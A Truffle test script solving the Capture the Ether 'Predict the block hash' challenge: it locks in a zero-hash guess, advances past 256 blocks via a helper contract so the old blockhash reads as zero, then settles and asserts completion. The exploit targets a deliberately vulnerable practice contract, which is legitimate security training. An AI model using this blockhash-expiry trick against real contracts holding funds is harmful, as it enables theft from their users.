const PredictTheBlockHashChallenge = artifacts.require('PredictTheBlockHashChallenge')
const AttackPredictTheBlockHash = artifacts.require('AttackPredictTheBlockHash')

contract('AttackPredictTheBlockHash', () => {
  it('solve the challenge', async () => {
    const challenge = await PredictTheBlockHashChallenge.new({ value: web3.toWei(1, 'ether') })
    const attackPredictTheBlockHash = await AttackPredictTheBlockHash.new()
    // const challenge = await PredictTheBlockHashChallenge.at('0xC40426fFFa1A02751a14CBAeBCE6cad18E32107E')
    // const attackPredictTheBlockHash = await AttackPredictTheBlockHash.at('0x24d537c80b08495b62e662a009db938375212119')

    // guess with '0x'
    await challenge.lockInGuess('', { value: web3.toWei(1, 'ether') })
    await attackPredictTheBlockHash.reset()
    var blockCount = await attackPredictTheBlockHash.blockCount()
    while (blockCount < 256) {
      console.log('blockCount: ' + blockCount)
      blockCount = await attackPredictTheBlockHash.blockCount()
      await attackPredictTheBlockHash.count()
    }

    challenge.settle()

    assert(await challenge.isComplete() === true)
  }).timeout(5000000000)
})
